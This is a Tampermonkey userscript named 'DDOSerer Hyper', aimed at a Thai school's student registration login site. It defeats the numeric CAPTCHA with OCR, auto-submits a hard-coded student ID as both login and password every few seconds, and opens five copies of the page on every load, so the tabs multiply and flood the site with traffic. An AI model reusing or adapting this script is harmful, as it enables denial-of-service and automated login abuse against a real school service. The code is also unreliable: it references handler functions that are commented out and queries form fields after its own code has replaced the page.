// ==UserScript==
// @name         DDOSerer Hyper
// @version      1.0.0a
// @description  Guess who's back? The DDOSer(er) returns!
// @namespace    http://tampermonkey.net/
// @match        https://skr.webactivity.online/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=webactivity.online
// @license      GNU General Public License v3.0
// @require      https://cdn.jsdelivr.net/npm/tesseract.js@2.1.4
// ==/UserScript==

(function () {
  "use strict";

  // Configuration Constants
  const HOST_ID = 52545;
  const GENERATOR_ENABLED = true;
  const GENERATOR_INTERVAL = 500;
  const TAB_COUNT = 5; // Number of tabs to open

  const config = {
    autoSubmit: {
      enabled: true,
      interval: 3000, // in milliseconds
    },
    ui: {
      streamlinedLogin: true,
    },
  };

  let isSubmitting = false;

  // URL action mappings
  const urlActions = {
    "https://skr.webactivity.online/student/": handleMainPage,
    "https://skr.webactivity.online/student/register_main.php":
      handleRegisterPage,
    "https://skr.webactivity.online/student/register_logout.php":
      handleLogoutPage,
  };

  // Decode the CAPTCHA using Tesseract.js
  async function decodeCaptcha() {
    const captchaImage = document.querySelector("#imgCaptcha");
    if (!captchaImage) throw new Error("CAPTCHA image not found");

    const {
      data: { text },
    } = await Tesseract.recognize(captchaImage.src, "eng", {
      tessedit_char_whitelist: "0123456789",
    });

    const captchaValue = text.replace(/\D/g, "");
    if (captchaValue.length === 5) return captchaValue;
    throw new Error("CAPTCHA length is not 5 digits");
  }

  // Fill the form inputs
  async function fillInputs() {
    const captchaValue = await decodeCaptcha();
    const studentIDInput = document.querySelector(
      'input[placeholder="เลขประจำตัวนักเรียน 5 หลัก"]'
    );
    const passwordInput = document.querySelector(
      'input[placeholder="รหัสผ่านที่โรงเรียนกำหนด"]'
    );
    const captchaInput = document.querySelector(
      'input[placeholder="พิมพ์ตัวเลขที่ปรากฏ"]'
    );

    if (!studentIDInput) throw new Error("Student ID input field not found!");
    studentIDInput.value = HOST_ID;

    if (!passwordInput) throw new Error("Password input field not found!");
    passwordInput.value = HOST_ID;

    if (!captchaInput)
      throw new Error(
        "CAPTCHA input field not found or CAPTCHA value is empty!"
      );
    captchaInput.value = captchaValue;
  }

  // Automatically submit the form
  async function autoSubmit() {
    if (isSubmitting) return;
    isSubmitting = true;

    try {
      const studentIDInput = document.querySelector(
        'input[placeholder="เลขประจำตัวนักเรียน 5 หลัก"]'
      );
      const passwordInput = document.querySelector(
        'input[placeholder="รหัสผ่านที่โรงเรียนกำหนด"]'
      );
      const captchaInput = document.querySelector(
        'input[placeholder="พิมพ์ตัวเลขที่ปรากฏ"]'
      );

      if (!studentIDInput.value || !passwordInput.value) await fillInputs();

      if (!captchaInput || captchaInput.value.trim() === "") {
        captchaInput.value = await decodeCaptcha();
      }

      const submitButton = document.getElementById("Submit");
      if (submitButton) submitButton.click();
    } catch (error) {
      location.reload();
    } finally {
      isSubmitting = false;
    }
  }

  // Streamline UI
  function streamlineUI() {
    if (!config.ui.streamlinedLogin) return;

    document.body.innerHTML = `
            <div class="login-container">
                <h2>Login</h2>
                <input type="text" id="username" placeholder="Username" required>
                <input type="password" id="password" placeholder="Password" required>
                <button id="login-button" onclick="login()">Login</button>
            </div>
        `;
    const style = document.createElement("style");
    style.innerHTML = `
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                font-family: Arial, sans-serif;
            }
            .login-container {
                width: 300px;
                padding: 20px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                border-radius: 5px;
                text-align: center;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 3px;
            }
            button {
                width: 100%;
                padding: 10px;
                background-color: #4CAF50;
                border: none;
                border-radius: 3px;
                color: white;
                font-size: 16px;
                cursor: pointer;
            }
            button:disabled {
                background-color: #ccc;
                cursor: not-allowed;
            }
        `;
    document.head.appendChild(style);
  }

  // Handle actions on the main page
  function handleMainPage() {
    streamlineUI();
    fillInputs();
    if (config.autoSubmit.enabled)
      setInterval(autoSubmit, config.autoSubmit.interval);
  }

  /*
    function handleRegisterPage() {
        
    }

    function handleLogoutPage() {
        
    }
    */

  function openMultipleTabs() {
    for (let i = 0; i < TAB_COUNT; i++) {
      window.open(window.location.href, "_blank");
    }
  }

  function checkAndPerformActions() {
    const currentUrl = window.location.href;
    const action = urlActions[currentUrl];
    if (action) {
      action();
      openMultipleTabs();
    }
  }

  window.addEventListener("load", checkAndPerformActions);
})();